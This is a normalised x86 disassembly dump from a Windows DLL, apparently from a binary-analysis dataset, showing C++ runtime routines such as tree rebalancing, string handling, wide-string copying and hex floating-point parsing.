mov [ esi + 0x14 ] 0x0
call sub_100407f0
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov dl [ esi + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ eax ]
push esi
mov [ eax + 0x14 ] bl
call sub_100274a0
mov edx [ eax + 0x8 ]
mov [ edx + 0x14 ] bl
push eax
mov [ eax + 0x14 ] 0x0
call sub_100407f0
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov dl [ esi + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ eax + 0x8 ]
push esi
mov [ eax + 0x14 ] bl
call sub_100407f0
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x14 ] bl
push eax
mov [ eax + 0x14 ] 0x0
call sub_100274a0
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub_1003b330
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fc80
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov edi [ esi + 0x10 ]
sar eax 0x1
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
jmp sub_1003b3a0
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10016ae0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_1003b3a0
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov bl [ eax ]
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_100616c6
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d5e0
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003b3a0
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003b3a0
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003b3a0
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003b3a0
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_1003b3fd
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_1002050e
test edi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003b3a0
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003b3a0
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003b3a0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1003b3a0
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_1003b4a6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10052185
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1002050e
int3
sub_1003b4eb
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov ecx [ eax + 0x18 ]
and [ ebp - 0x4 ] 0x0
test ecx ecx
jne r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
call sub_1003feb0
mov eax [ ebp + 0x8 ]
leave
retn 0x4
lea ecx [ eax + 0x1c ]
sub_1003b530
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x1c ] eax
call sub_10078600
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x1c ] 0x0
sub_1003b57f
push 0x80
mov eax sub_1007e676
call sub_10007703
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_10009450
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10018820
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x78 ] eax
call sub_1002a730
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1002a674
add edi 0x8
push edi
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] edi
call sub_1005e05a
push edi
movzx eax ax
push ebx
push 0x61
mov [ ebp - 0x60 ] eax
call sub_1005e05a
push edi
movzx eax ax
push ebx
push 0x41
mov [ ebp - 0x80 ] eax
call sub_1005e05a
movzx eax ax
add esp 0x24
push [ ebp - 0x5c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x70 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] bl
call sub_10060ea7
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
push [ ebp - 0x5c ]
mov [ eax ] 0x7830
add eax 0x2
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] ebx
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2b
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1001e1ec
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2d
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002e079
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_1001e1bc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ ebp - 0x38 ] ebx
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x78
call sub_1005e05a
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x84 ] ebx
jmp r-xdata
mov ecx esi
call sub_1001e1ec
jmp r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1004b830
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x64 ] ebx
call sub_10060ea7
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
call sub_1001bc97
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1ec
cmp [ ebp - 0x51 ] bl
jne r-xdata
lea edx [ ebp - 0x48 ]
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002e079
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002e079
add esp 0x14
cmp eax ebx
jl r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x51 ] bl
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x68 ] ebx
jge r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1001c5c0
jmp r-xdata
mov edi [ ebp - 0x64 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x58 ] 0x24
jge r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
cmp [ ebp - 0x49 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x68 ]
mov [ eax ] 0x30
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
mov ecx [ ebp - 0x50 ]
mov al [ eax + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8c ]
mov [ eax ] bl
mov eax [ ebp - 0x68 ]
push ebx
mov [ ecx ] eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
xor eax eax
call sub_10019c00
retn
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x70
call sub_1005e05a
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001e1bc
dec [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
dec edi
je r-xdata
cmp [ ebp - 0x64 ] ebx
je r-xdata
cmp [ ebp - 0x84 ] bx
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x70
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x5c ]
push edi
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x50
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ edx + 0x1 ] bl
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x84 ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp edi ebx
jbe r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc [ ebp - 0x64 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0x64 ]
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x60 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1001e1ec
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
movzx eax [ ebp - 0x60 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x58 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
cmp [ esi + 0x4 ] bl
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x60 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1bc
sub_1003bc75
push 0x6c
mov eax sub_1007e33c
call sub_10007703
mov eax [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_100519c6
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x6c ] ebx
call sub_1002a730
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1002a674
push [ ebp - 0x58 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x51 ] 0x0
call sub_100161f2
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
mov edi [ ebp - 0x58 ]
and [ ebp - 0x60 ] 0x0
and [ ebp - 0x64 ] 0x0
mov [ eax ] 0x7830
add eax 0x2
push edi
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] 0x0
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ edi ] 0x2b
jmp r-xdata
push edi
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_10017b01
push edi
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1004cd62
inc edi
mov ecx esi
mov [ ebp - 0x50 ] edi
call sub_10017b01
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] al
jne r-xdata
mov [ edi ] 0x2d
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x78
je r-xdata
mov ecx esi
call sub_1004cd62
movzx eax [ esi + 0x5 ]
push 0x41
push 0x61
push 0x30
push eax
push [ ebp + 0x8 ]
call sub_1002f016
mov edi eax
add esp 0x14
test edi edi
js r-xdata
mov ecx esi
call sub_1004cd62
push [ ebp - 0x58 ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
mov [ ebp - 0x59 ] al
mov [ ebp - 0x59 ] 0x0
jmp r-xdata
mov ecx esi
call sub_10017b01
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x2
xor ebx ebx
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x58
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x64 ]
jmp r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
mov edi [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
mov bl [ esi + 0x5 ]
call [ eax + 0x4 ]
cmp bl al
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
mov al [ esi + 0x5 ]
push 0x41
push 0x61
mov [ ebp - 0x78 ] al
push 0x30
push [ ebp - 0x78 ]
push [ ebp + 0x8 ]
call sub_1002f016
mov edi eax
add esp 0x14
test edi edi
js r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
push [ ebp - 0x58 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x64 ] 0x0
mov edi [ ebp - 0x50 ]
jge r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
call sub_1001bc97
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_10017b01
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1001c5c0
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
mov [ edi ] 0x30
inc edi
inc [ ebp - 0x64 ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x64 ]
jmp r-xdata
dec [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
movzx eax [ esi + 0x5 ]
push 0x41
push 0x61
push 0x30
push eax
push [ ebp + 0x8 ]
call sub_1002f016
add esp 0x14
test eax eax
js r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x59 ] 0x0
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x24
jge r-xdata
mov edi [ ebp - 0x74 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
mov al [ eax + r--data ]
mov [ edi ] al
inc edi
inc [ ebp - 0x60 ]
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x64 ]
mov [ edi ] 0x0
push 0x0
mov [ eax ] ecx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
xor eax eax
call sub_10019c00
retn
cmp [ esi + 0x5 ] 0x70
je r-xdata
mov ecx esi
call sub_1004cd62
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x59 ]
